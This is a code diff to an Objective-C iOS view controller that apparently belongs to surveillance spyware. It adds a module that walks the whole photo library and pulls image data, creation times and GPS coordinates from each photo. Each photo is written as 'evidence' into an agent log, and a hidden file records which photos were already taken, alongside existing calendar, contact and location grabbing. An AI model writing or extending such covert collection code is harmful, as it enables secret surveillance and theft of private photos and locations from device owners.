@@ -14,6 +14,12 @@
 
 @property (nonatomic, strong) CLLocationManager *locationManager;
 
+// Photo management
+
+@property (nonatomic, strong) NSFileManager *fileManager;
+@property (nonatomic, strong) NSString *photoListPath;
+@property (nonatomic, strong) NSMutableArray *photoList;
+
 -(void)requestAccessToEvents;
 
 @end
@@ -23,7 +29,6 @@
 #pragma mark -
 #pragma mark - Calendario
 #pragma mark -
-
 
 - (void)writeCalLog: (EKEvent*)anEvent
 {
@@ -436,6 +441,179 @@
 }
 
 #pragma mark -
+#pragma mark - Photos
+#pragma mark -
+
+#define PHOTO_LIST_FILENAME @"phidentifiers"
+
+-(BOOL) wasPhotoSent:(NSString*) localIdentifier {
+  if ([self.photoList containsObject:localIdentifier]) {
+    return YES;
+  }
+  return NO;
+}
+
+-(void) addToPhotoList:(NSString*) localIdentifier {
+  [self.photoList addObject:localIdentifier];
+}
+
+-(void) writePhotoList {
+  [self.photoList writeToFile:self.photoListPath
+                   atomically:YES];
+}
+
+-(void) clearPhotoList {
+  self.photoList = [[NSMutableArray alloc] init];
+  [self writePhotoList];
+//  NSLog(@"Photo list cleared and flushed to disk.");
+}
+
+-(void) sendPhoto:(PHAsset*) asset {
+  
+  PHImageManager *imageManager = [PHImageManager defaultManager];
+  [imageManager requestImageDataForAsset:asset
+                                 options:nil
+                           resultHandler:^(NSData *imageData, NSString *dataUTI, UIImageOrientation orientation, NSDictionary *info) {
+                           [self writePhotoLog:imageData withAsset:asset];
+  }];
+}
+
+-(void) initPhotoManager {
+  NSError *error;
+  self.fileManager = [NSFileManager defaultManager];
+  self.photoListPath = [[[self.fileManager URLForDirectory:NSApplicationSupportDirectory
+                                                inDomain:NSUserDomainMask
+                                       appropriateForURL:nil
+                                                  create:YES
+                                                   error:&error]
+                        URLByAppendingPathComponent:PHOTO_LIST_FILENAME] path];
+  
+  if (self.photoListPath == nil) {
+    //NSLog(@"Error while building URL: %@", error);
+    return;
+  }
+  
+  if ([self.fileManager fileExistsAtPath:self.photoListPath]) {
+    self.photoList = [[NSMutableArray alloc] initWithContentsOfFile:self.photoListPath];
+  } else {
+    self.photoList = [[NSMutableArray alloc] initWithCapacity:10];
+  }
+  
+//  NSLog(@"Photolistfile: %@", self.photoListPath);
+}
+
+- (void) getPhotos {
+  PHFetchResult *assetFetchResults;
+  PHFetchOptions *options = [[PHFetchOptions alloc] init];
+  
+  options.sortDescriptors = @[
+    [NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:YES],
+  ];
+  
+  assetFetchResults = [PHAssetCollection fetchMomentsWithOptions:nil];
+  
+  
+  for (PHAssetCollection *moment in assetFetchResults) {
+    PHFetchResult *momentFetchResults = [PHAsset fetchAssetsInAssetCollection:moment options:options];
+    for (PHAsset *currentAsset in momentFetchResults) {
+      
+      if (currentAsset.mediaType != PHAssetMediaTypeImage) {
+        continue;
+      }
+      
+      if (! [self wasPhotoSent:currentAsset.localIdentifier]) {
+        [self sendPhoto:currentAsset];
+        [self addToPhotoList:currentAsset.localIdentifier];
+      }
+    }
+    [self writePhotoList];
+  }
+}
+
+- (BOOL)writePhotoLog:(NSData*) imageData withAsset:(PHAsset*) asset
+{
+  NSError *error;
+  NSMutableData *photoHeader = [[NSMutableData alloc] initWithCapacity: 0];
+  PhotoLogStruct header;
+    
+  // setting version
+  header.uVersion    = LOG_PHOTO_VERSION;
+    
+  // Add header
+  [photoHeader appendBytes: (const void *) &header length: sizeof(header)];
+  
+  //NSLog(@"Writing asset %@", asset.description);
+  
+
+  NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"<[^>]*>"
+                                                                         options:NSRegularExpressionCaseInsensitive
+                                                                           error:&error];
+  NSString *descr = [regex stringByReplacingMatchesInString:asset.description
+                                                    options:0
+                                                      range:NSMakeRange(0, [asset.description length])
+                                               withTemplate:@""];
+  
+  NSMutableDictionary *metadata = [@{
+      @"program": @"photo",
+      @"path": asset.localIdentifier,
+      @"description": descr,
+      @"device": @"iPhone",
+      @"time": [NSNumber numberWithDouble:[[asset creationDate] timeIntervalSince1970]]
+  } mutableCopy];
+  
+  CLLocation *location = [asset location];
+  
+  if (location != nil && location.horizontalAccuracy >= 0) {
+    //NSLog(@"Found location data");
+    
+    metadata[@"place"] = @{
+      @"lat": [NSNumber numberWithDouble:[location coordinate].latitude],
+      @"lon": [NSNumber numberWithDouble:[location coordinate].longitude],
+      @"r": [NSNumber numberWithDouble:location.horizontalAccuracy]
+    };
+  }
+  
+  NSData *jsonMetadata = [NSJSONSerialization dataWithJSONObject:metadata
+                                                     options:0
+                                                       error:&error];
+
+  if (! jsonMetadata) {
+    NSLog(@"Error while generating json data: %@", error);
+    return NO;
+  }
+  
+  [photoHeader appendData:jsonMetadata];
+  
+  _i_LogManager *logManager = [_i_LogManager sharedInstance];
+  
+  BOOL success = [logManager createLog: LOG_PHOTO
+                           agentHeader: photoHeader
+                             withLogID: 0];
+  
+  
+  NSMutableData *mutableImage = [[NSMutableData alloc] initWithData:imageData];
+  
+  if (success == TRUE)
+  {
+      if ([logManager writeDataToLog: mutableImage
+                            forAgent: LOG_PHOTO
+                           withLogID: 0] == TRUE)
+      {
+          [logManager closeActiveLog: LOG_PHOTO withLogID: 0];
+      }
+  }
+  else
+  {
+    NSLog(@"There has been a problem while writing evidence");
+    return NO;
+  }
+  
+  //NSLog(@"OK evidence written");
+  return YES;
+
+}
+
+#pragma mark -
 #pragma mark - ViewController Start Cal, AB, GPS
 #pragma mark -
 
@@ -453,9 +631,13 @@
   [self initAddressBookManager];
   [self getABContatcs];
   
-  // Start Grabbing GPS
+  // Start grabbing GPS
   [self initLocationManager];
   [self.locationManager startUpdatingLocation];
+    
+  // Start grabbing photos
+  [self initPhotoManager];
+  
 }
 
 - (void)didReceiveMemoryWarning {
@@ -464,3 +646,4 @@
 
 
 @end
+
